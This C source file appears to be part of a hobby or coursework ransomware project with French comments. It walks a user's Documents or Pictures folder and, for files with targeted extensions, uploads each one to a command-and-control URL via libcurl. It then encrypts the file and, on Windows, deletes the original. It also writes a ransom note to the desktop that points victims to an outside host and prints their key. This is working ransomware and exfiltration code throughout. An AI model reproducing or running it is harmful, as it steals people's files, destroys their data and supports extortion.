//
//
//
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>


#include "files.h"

void create_prank_file(const char *key) {
    char path[1024];
    char user[256];

    #ifdef _WIN32
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) {
        strcat(path, "\\ransom.txt");
    } else {
        fprintf(stderr, "Failed to get desktop directory.\n");
        return;
    }
    #else
    char *homeDir = getenv("HOME");
    if (homeDir != NULL) {
        snprintf(path, sizeof(path), "%s/Desktop/ransom.txt", homeDir);
    } else {
        fprintf(stderr, "Unable to get HOME environment variable.\n");
        return;
    }
    #endif

    FILE *file = fopen(path, "w");
    if (file == NULL) {
        fprintf(stderr, "Failed to create file.\n");
        return;
    }

    fprintf(file, "We locked all your files, cuz of skills issues XDXDXDXDXDXD\nTo get your files back, follow this link and follow the instructions: http://willchabemyvalentine.love:42956/victim_login\nUse this to connect: %s\nGet rekd :3\nBest regards", key);
    fclose(file);

    printf("File created at: %s\n", path);
}



void sendFileToApi(const char *path, const char *id, const char *api){
    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
    CURL *curl;
    CURLcode res;
    curl_mime *form = NULL;
    curl_mimepart *field = NULL;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        form = curl_mime_init(curl);

        // Add the file
        field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, path);

        // Add id
        field = curl_mime_addpart(form);
        curl_mime_name(field, "id");
        curl_mime_data(field, id, CURL_ZERO_TERMINATED);

        // Add road of the api
        curl_easy_setopt(curl, CURLOPT_URL, api);

        // Attach everything
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        // Execute
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        // Clean to make a new upload
        curl_mime_free(form);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

}

char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size){
    char* lisible = (char*)malloc(sequence_size * 2 + 1); // +1 pour le caractère de fin de chaîne
    if (lisible == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        exit(EXIT_FAILURE);
    }
    size_t j = 0;
    for (size_t i = 0; i < sequence_size; ++i) {
        j += sprintf(&lisible[j], "%02x", byte_sequence[i]);
    }
    // printf("KEY / IV : %s\n", lisible); // Affiche la représentation hexadécimale
    return lisible;
}

void write_to_file(char *filename, char *value, int size){
    FILE *file_pointer;
    file_pointer = fopen(filename, "w"); // Ouvre le fichier en mode écriture

    if (file_pointer == NULL) {
        printf("Error: cannot open the file.\n");
    }

    fwrite(value, sizeof(char), size, file_pointer); // Écrit la clé dans le fichier

    fclose(file_pointer); // Ferme le fichier
}

void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL){
    // List all the files we want to encrypt
    const char *path;

    #ifdef _WIN32
    path = "C:\\Users\\me\\Documents";
    #else
    path = "/home/mike/Pictures";
    #endif

    PathList pathList;
    initPathList(&pathList);

    listFiles(path, &pathList);

    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {

        if (strstr(pathList.paths[i], "basic_c/") != NULL) {
            continue; // Ignorer le dossier "basic_c" et ses fichiers
        }
        
        // Check if the file has one of the specified extensions
        char *extension = strrchr(pathList.paths[i], '.');
        if (extension != NULL) {
            for (size_t j = 0; j < num_extensions; ++j) {
                if (strcmp(extension, extensions[j]) == 0) {
                    // Send the files to the C2 before being encrypted
                    sendFileToApi(pathList.paths[i], id, URL);
                    // Encrypt the file
                    encrypt_file(key, iv, aad, pathList.paths[i]);
                    // Decrypt the file (for demonstration purposes)
                    sleep(1);
                    #ifdef _WIN32
                    // Supprimer le fichier d'origine après chiffrement sur Windows
                    if (remove(pathList.paths[i]) == 0) {
                        printf("File deleted successfully: %s\n", pathList.paths[i]);
                    } else {
                        printf("Error deleting file: %s\n", pathList.paths[i]);
                    }
                    #endif
                    break;
                }
            }
        }
    }

    freePathList(&pathList);
}


// Function to list files for both Linux and Windows
void listFiles(const char *path, PathList *pathList) {
    
#ifdef _WIN32
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    char dirSpec[MAX_PATH];
    snprintf(dirSpec, sizeof(dirSpec), "%s\\*", path);

    hFind = FindFirstFile(dirSpec, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    } 

    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
                char subPath[MAX_PATH];
                snprintf(subPath, sizeof(subPath), "%s\\%s", path, findFileData.cFileName);
                listFiles(subPath, pathList);
            }
        } else {
            char filePath[MAX_PATH];
            snprintf(filePath, sizeof(filePath), "%s\\%s", path, findFileData.cFileName);
            addToPathList(pathList, filePath);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);

#else
    struct dirent *entry;
    DIR *dp = opendir(path);

    if (dp == NULL) {
        return;
    }

    while ((entry = readdir(dp)) != NULL) {
        if (entry->d_type == DT_REG) {
            char filePath[1024];
            snprintf(filePath, sizeof(filePath), "%s/%s", path, entry->d_name);
            addToPathList(pathList, filePath);
        } else if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char subPath[1024];
                snprintf(subPath, sizeof(subPath), "%s/%s", path, entry->d_name);
                listFiles(subPath, pathList);
            }
        }
    }

    closedir(dp);
#endif
}

//Init PathList structure
void initPathList(PathList *pathList) {
    pathList->paths = NULL;
    pathList->count = 0;
    pathList->capacity = 0;
}

void addToPathList(PathList *pathList, const char *path) {
    if (pathList->count >= pathList->capacity) {
        //Increase list size
        pathList->capacity = (pathList->capacity == 0) ? 1 : pathList->capacity * 2;
        pathList->paths = realloc(pathList->paths, pathList->capacity * sizeof(char *));
    }

    pathList->paths[pathList->count] = strdup(path);
    pathList->count++;
}

void freePathList(PathList *pathList) {
    for (size_t i = 0; i < pathList->count; i++) {
        free(pathList->paths[i]);
    }
    free(pathList->paths);
    pathList->paths = NULL;
    pathList->count = 0;
    pathList->capacity = 0;
}
//<-End of linux functions
